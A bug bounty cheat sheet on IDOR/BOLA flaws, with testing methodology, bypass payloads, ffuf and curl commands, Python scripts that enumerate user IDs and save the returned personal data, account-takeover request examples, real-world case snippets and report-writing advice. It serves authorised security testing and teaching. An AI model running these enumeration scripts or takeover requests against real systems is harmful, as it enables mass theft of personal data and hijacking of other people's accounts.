

# 🔓 IDOR Cheat Sheet for Bug Bounty Hunters

> **Insecure Direct Object Reference (IDOR)** — also called **BOLA (Broken Object Level Authorization)** — happens when an application lets you access or modify another user's data just by changing an identifier (ID), without checking if you actually own that resource.

---

## 🧠 Think Like a Hacker

> **Golden Rule:** If you change an ID in a request and the server gives you data that doesn't belong to you → **IDOR confirmed.**

**Three ingredients for IDOR:**
1. An **object** (account, document, order, file)
2. A **reference** to that object (ID, UUID, filename, token)
3. A **missing ownership check** on the server

---

## 📋 Where to Find IDORs

| Location | Examples |
|----------|----------|
| **URL Path** | `/api/users/123`, `/documents/456.pdf` |
| **Query Parameter** | `?user_id=123`, `?order_id=789` |
| **POST Body (JSON)** | `{"user_id": 123, "order_id": 456}` |
| **POST Body (Form)** | `user_id=123&file_id=456` |
| **HTTP Headers** | `X-User-ID: 123`, `X-Account-ID: 456` |
| **Cookies** | `user_id=123; session=abc` |
| **Hidden Form Fields** | `<input type="hidden" name="user_id" value="123">` |
| **GraphQL** | `query { user(id: 123) { email } }` |

---

## 🎯 Step-by-Step Discovery Methodology

### Phase 1: Setup (Always Start Here)

```
✅ Create at least 2 test accounts (User A + User B)
✅ Create resources with each account (orders, files, messages, etc.)
✅ Write down the exact IDs of resources owned by each user
✅ Install Burp Suite + Autorize extension
✅ Capture baseline: User A accessing their OWN resources
```

### Phase 2: Map the Target

```
1. Crawl the app (Burp Spider, Katana, or manual browsing)
2. Find every endpoint that accepts an object identifier
3. Note the HTTP method: GET (read), PUT/PATCH (write), DELETE (delete)
4. Classify: Is it a user resource, admin resource, or tenant resource?
```

### Phase 3: Test Horizontal IDOR (Same Role, Different User)

```
# User A's legitimate request
GET /api/users/123/profile HTTP/1.1
Authorization: Bearer <User_A_Token>

# IDOR Test: Change ID to User B's ID, keep User A's token
GET /api/users/124/profile HTTP/1.1
Authorization: Bearer <User_A_Token>

# VULNERABLE if: Server returns User B's data with User A's token
```

**Test ALL HTTP methods:**
```
GET    /api/users/124      → Read other user's data
PUT    /api/users/124      → Modify other user's data
DELETE /api/users/124      → Delete other user's data
POST   /api/messages       → Send as another user
```

### Phase 4: Test Vertical IDOR (Low Privilege → High Privilege)

```
# Try accessing admin endpoints with standard user token
GET /api/admin/users/123
GET /api/admin/reports
GET /api/system/config

# Try modifying role or permissions
PUT /api/users/123
{
  "role": "admin",
  "permissions": ["read", "write", "delete"]
}
```

### Phase 5: Test Multi-Tenant IDOR (Cross-Organization)

```
# Replace org_id with another organization's ID
GET /api/orgs/tenant_bbb/customers
Authorization: Bearer <User_from_tenant_aaa>

# Test in URL path, query params, and body
GET /api/customers?org_id=tenant_bbb
POST /api/export {"org_id": "tenant_bbb"}
```

### Phase 6: Test Second-Order IDOR (Stored & Reused)

```
# Step 1: Create a resource as User A
POST /api/orders
{"items": ["item1", "item2"]}
→ Response: {"order_id": 999, "status": "pending"}

# Step 2: Try to access/modify that order as User B
GET /api/orders/999
Authorization: Bearer <User_B_Token>

# VULNERABLE if: User B can access User A's order
```

### Phase 7: Test Blind IDOR (No Data in Response)

```
# Delete operations
DELETE /api/comments/5521
Authorization: Bearer <User_who_does_NOT_own_5521>
→ 204 No Content (but comment was deleted!)

# State changes
POST /api/notifications/mark-read
{"notification_ids": [881, 882, 883]}
→ {"updated": 3} (but these are another user's notifications!)

# Time-based detection
time curl -X DELETE https://target.com/api/user/124
→ If it takes longer, it might be processing (vulnerable)
```

---

## 🔥 All Payloads & Bypass Techniques

### 1. Numeric ID Manipulation

```
# Basic increment/decrement
Original: /api/invoice/1234
Test:     /api/invoice/1235
Test:     /api/invoice/1233

# Range testing (Bash loop)
for id in {1..1000}; do
  curl -s "https://api.target.com/user/$id" -H "Authorization: Bearer TOKEN"
done

# Step-based (some systems skip IDs)
for id in {100..10000..100}; do
  curl -s "https://api.target.com/order/$id"
done
```

### 2. Non-Numeric Identifiers

```
# Username / Email based
Original: ?email=test1@mail.com
Test:     ?email=test2@mail.com

# Filename based
Original: /download?file=document_123.pdf
Test:     /download?file=document_124.pdf
Test:     /download?file=../admin/secret.pdf

# Order number based
Original: /order/INV-2024-0001
Test:     /order/INV-2024-0002
```

### 3. Encoded / Hashed IDs

```
# Base64 encoded
Original: user_id=MTIz  (123 in base64)
Test:     user_id=MTI0  (124 in base64)

# MD5 hashed
echo -n "123" | md5sum  → 202cb962ac59075b964b07152d234b70
echo -n "124" | md5sum  → 4000808b00a5be7b000a8b1bf800e3b6
Test: /api/user/202cb962ac59075b964b07152d234b70

# URL-safe Base64
echo -n "user:123" | base64  → dXNlcjoxMjM=
echo -n "user:124" | base64  → dXNlcjoxMjQ=

# Hex encoded
Original: id=313233  ("123" in hex)
Test:     id=313234  ("124" in hex)
```

### 4. UUID/GUID Manipulation

```
# UUID v1 (time-based, predictable if you know the timestamp)
550e8400-e29b-41d4-a716-446655440000

# MongoDB Object IDs (predictable structure)
5ae9b90a2c144b9def01ec37
→ 4-byte timestamp + 3-byte machine ID + 2-byte process ID + 3-byte counter

# Leaked UUIDs (check JavaScript files, API responses, emails, public profiles)
```

### 5. Parameter Pollution

```
# Multiple same-name parameters
GET /api/profile?user_id=123&user_id=124
GET /api/profile?user_id=124&user_id=123

# Array-based
GET /api/profile?user_id[]=123&user_id[]=124

# JSON parameter pollution
POST /api/update
{
  "user_id": 123,
  "user_id": 124,
  "email": "attacker@evil.com"
}
```

### 6. HTTP Method Bypass

```
# If GET is blocked, try other methods
GET  /api/user/123   → 403 Forbidden
POST /api/user/123   → 200 OK (vulnerable!)
PUT  /api/user/123   → 200 OK (vulnerable!)
HEAD /api/user/123   → 200 OK (vulnerable!)
PATCH /api/user/123  → 200 OK (vulnerable!)
```

### 7. Content-Type Bypass

```
# Original JSON request (blocked)
POST /api/update-profile
Content-Type: application/json
{"user_id": 124}

# Try XML
POST /api/update-profile
Content-Type: application/xml
<user><user_id>124</user_id></user>

# Try form data
POST /api/update-profile
Content-Type: application/x-www-form-urlencoded
user_id=124

# Try multipart
POST /api/update-profile
Content-Type: multipart/form-data
------WebKitFormBoundary
Content-Disposition: form-data; name="user_id"

124
```

### 8. Array Wrapping & Nested Objects

```
# Blocked
{"user_id": 124}

# Try array wrapping
{"user_id": [124]}

# Try nested object
{"user": {"id": 124}}

# Try multiple values
{"user_id": [123, 124]}

# Try null
{"user_id": null}

# Try empty string
{"user_id": ""}
```

### 9. Path Traversal in IDs

```
GET /api/user/123
GET /api/user/../user/124
GET /api/user/./124
GET /api/user/%2e%2e%2fuser%2f124
GET /api/user/..%2fuser%2f124
GET /api/user/123%00/../../user/124  (null byte - older systems)
```

### 10. Wildcard Exploitation

```
GET /api/user/*
GET /api/user/%
GET /api/user/_
GET /api/user/.*
GET /api/user/[0-9]+
GET /api/users?ids=1-100
GET /api/users?ids=*
```

### 11. JWT-Based IDOR (Request vs Token)

```
# JWT payload says you are User A:
"user_id": 5

# But request body controls User B:
{"user_id": 7}

# VULNERABLE if: Backend uses 7 from body instead of 5 from JWT

# ❌ NOT IDOR if you modify JWT itself and re-sign it
# → That's JWT tampering, not IDOR
```

### 12. Mass Assignment (Adding Extra Fields)

```
# Original intended request
POST /api/update-profile
{
  "name": "John Doe",
  "email": "john@example.com"
}

# Add unauthorized fields
POST /api/update-profile
{
  "name": "John Doe",
  "email": "john@example.com",
  "user_id": 124,              # Target another user
  "role": "admin",             # Privilege escalation
  "is_verified": true,         # Bypass verification
  "balance": 999999            # Modify sensitive data
}
```

### 13. GraphQL IDOR

```
# Capture GraphQL request
POST /graphql
{
  "query": "query { user(id: "123") { email phone ssn } }"
}

# Decode if Base64 (Relay-style IDs)
gid://app/User/43794  → Base64 encoded

# Change ID number
{
  "query": "query { user(id: "124") { email phone ssn } }"
}

# Try introspection to find all fields
{
  "query": "{ __schema { types { name fields { name } } } }"
}
```

### 14. Cookie Manipulation

```
# Original cookie
Cookie: user_id=123; session=abc123

# Modified cookie
Cookie: user_id=124; session=abc123

# Base64 encoded cookies
Cookie: user_data=eyJ1c2VyX2lkIjoxMjN9
# Decode: {"user_id":123}
# Modify to: {"user_id":124}
# Re-encode and test
```

### 15. Token Confusion

```
# Use expired tokens (some systems validate token but ignore expiry)

# Use tokens from different endpoints
# Token from /api/v1/user might work on /api/v2/user

# Missing token validation
# Try without Authorization header
curl https://api.target.com/user/124

# JWT algorithm confusion
# Change alg from RS256 to HS256
# Change alg to "none"
```

---

## 🛠️ Tools for IDOR Hunting

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Burp Suite** | Intercept, modify, replay requests | Intruder for ID enumeration |
| **Burp Autorize** | Auto-replay requests with different user | Install from BApp Store |
| **Burp AuthMatrix** | Test access control across roles | Install from BApp Store |
| **FFUF** | Fast fuzzing for ID enumeration | `ffuf -u https://target.com/api/user/FUZZ -w ids.txt` |
| **wfuzz** | Web fuzzer | `wfuzz -c -z file,ids.txt https://target.com/api/user/FUZZ` |
| **Postman** | Manual API testing | Import collection, test endpoints |
| **OWASP ZAP** | Alternative to Burp | Forced Browse, Auth Matrix |
| **InQL** | GraphQL testing | Burp extension for GraphQL IDOR |

### FFUF Commands for IDOR

```bash
# Basic ID fuzzing
ffuf -u https://target.com/api/user/FUZZ -w numbers.txt -mc 200

# With authentication
ffuf -u https://target.com/api/user/FUZZ \
  -w ids.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,301,302 \
  -fs 0

# POST request fuzzing
ffuf -u https://target.com/api/user \
  -w ids.txt \
  -X POST \
  -d '{"user_id":"FUZZ"}' \
  -H "Content-Type: application/json"

# File download IDOR
ffuf -u https://target.com/download.php?id=FUZZ \
  -H "Cookie: PHPSESSID=xxx" \
  -w <(seq 0 6000) \
  -fr 'File Not Found'
```

### Python Script for IDOR Enumeration

```python
import requests
import json

base_url = "https://target.com/api/user/"
headers = {"Authorization": "Bearer YOUR_TOKEN"}
valid_responses = []

for user_id in range(1, 1000):
    url = base_url + str(user_id)
    response = requests.get(url, headers=headers, timeout=5)

    if response.status_code == 200:
        if "email" in response.text or "phone" in response.text:
            valid_responses.append({
                "id": user_id,
                "status": response.status_code,
                "length": len(response.text),
                "data": response.json()
            })
            print(f"[+] Found: User ID {user_id}")

# Save results
with open("idor_results.json", "w") as f:
    json.dump(valid_responses, f, indent=2)
```

---

## 🧪 Real-World Bug Bounty Ideas (From Labs & Reports)

### Idea 1: Profile Picture IDOR
```
POST /api/upload-avatar
{"user_id": 124, "image": "..."}

# Change another user's profile picture
# Impact: Reputation damage, XSS via SVG
```

### Idea 2: Order Information IDOR
```
GET /api/orders/12345
→ Change to /api/orders/12346
→ Access other customer's orders, PII leak
```

### Idea 3: Message/Chat IDOR
```
GET /api/messages?user_id=123
→ Change to user_id=124
→ Read other users' private messages
```

### Idea 4: File/Document IDOR
```
GET /download?file_id=551
→ Change to file_id=552
→ Download other users' documents, contracts, IDs
```

### Idea 5: Notification Settings IDOR
```
POST /api/settings/notifications
{"user_id": 124, "email_notifications": false}
→ Disable another user's notifications
```

### Idea 6: Friend Request IDOR
```
POST /api/friend-request
{"to_user": 124}
→ Send friend request as another user
→ Or accept/reject requests for other users
```

### Idea 7: Password Reset IDOR
```
POST /api/reset-password
{"user_id": 124, "new_password": "hacked123"}
→ Reset another user's password
```

### Idea 8: Email Change IDOR
```
PUT /api/user/124/email
{"new_email": "attacker@evil.com"}
→ Change victim's email, then reset password
→ Full account takeover
```

### Idea 9: Payment Method IDOR
```
GET /api/user/124/payment-methods
→ Access other users' credit cards
```

### Idea 10: Multi-Tenant Org Switching
```
GET /api/customers?org_id=tenant_bbb
→ Access all customers from another organization
```

### Idea 11: Wristband/QR Code IDOR (Carlsberg Case)
```
# Wristband IDs like C-285-100
# Hex-encoded and used as bearer tokens
# ~26M combinations, trivial to brute force

import requests

def to_hex(s):
    return ''.join(f"{ord(c):02x}" for c in s)

for band_id in ["C-285-100", "T-544-492"]:
    hex_id = to_hex(band_id)
    r = requests.get("https://target.com/api", params={"id": hex_id})
    if r.ok and "media" in r.text:
        print(band_id, "->", r.json())
```

### Idea 12: McHire Chatbot IDOR (64M Records)
```
# PUT /api/lead/cem-xhr
# Body: {"lead_id": 64185741}
# Sequential 8-digit IDs
# Decrease lead_id to get arbitrary applicants' PII

curl -X PUT 'https://target.com/api/lead/cem-xhr' \
  -H 'Content-Type: application/json' \
  -d '{"lead_id":64185741}'
```

---

## 📝 How to Write a Good IDOR PoC (Proof of Concept)

### Structure Your Report:

```
1. Summary
   - What is the vulnerability?
   - What is the impact?

2. Steps to Reproduce
   - Step 1: Create Account A and Account B
   - Step 2: Login as Account A
   - Step 3: Intercept the request to [endpoint]
   - Step 4: Change [parameter] from [A's ID] to [B's ID]
   - Step 5: Observe that Account A can access Account B's [resource]

3. Proof of Concept (HTTP Request/Response)
   - Include the exact request with modified parameter
   - Include the response showing unauthorized data

4. Impact
   - What can an attacker do?
   - How many users could be affected?
   - Can it lead to account takeover?

5. Mitigation
   - Implement server-side ownership checks
   - Use indirect references (UUIDs)
   - Add rate limiting
```

### Example PoC:

```http
# REQUEST (as User A)
GET /api/orders/10021 HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs... (User A's token)

# RESPONSE (should be 403, but returns 200)
HTTP/1.1 200 OK
Content-Type: application/json

{
  "order_id": "10022",
  "user_id": 99,
  "customer_name": "Victim User",
  "email": "victim@example.com",
  "address": "123 Victim St",
  "items": [...],
  "total": 1499.00
}
```

---

## 🏆 CVSS Scoring for IDOR

| Type | Scenario | CVSS 4.0 Score |
|------|----------|----------------|
| Read | Single record, low sensitivity | ~5.3 |
| Read | Single record, high sensitivity (PII) | ~6.9 |
| Read | All records for one user | ~7.1 |
| Read | All records across all users | ~8.8 |
| Read | Multi-tenant, full org exposure | ~9.1 |
| Write | Modify another user's resource | ~8.8 |
| Write | Modify admin-level resource | ~9.1 |
| Delete | Delete another user's data | ~7.5 |
| Delete | Delete critical business records | ~8.5 |
| Multi-tenant | Any of the above at org scale | 8.8 - 9.5 |

---

## ✅ Golden Rules (احفظهم)

1. **IDOR ≠ numeric ID only** — identifiers can be anything: UUID, email, filename, token
2. **Identifier = anything that points to a resource**
3. **Validation ≠ Authorization** — input validation is not access control
4. **Same cookie + access other data = 🚨**
5. **Always test Read / Write / Delete** — don't stop at GET requests
6. **Two accounts minimum** — you can't test IDOR with one account
7. **Document everything** — write down IDs, tokens, and baseline responses
8. **Check JavaScript files** — they often leak hidden endpoints and IDs
9. **Encoding is not security** — Base64, hex, MD5 don't protect against IDOR
10. **Rate limiting claims are often false** — verify them yourself

---

## 🔗 References & Further Reading

- [OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [PortSwigger - IDOR](https://portswigger.net/web-security/access-control/idor)
- [PortSwigger - Testing for IDORs](https://portswigger.net/web-security/access-control/testing)
- [HackTricks - IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [Intigriti - IDOR](https://www.intigriti.com/researchers/hackademy/idor)
- [HackerOne - The Rise of IDOR](https://hackerone.com/reports/)

---

> **Remember:** IDOR is the #1 vulnerability class in bug bounties. It's simple to find, easy to exploit, and often pays very well. Happy hunting! 🐛💰
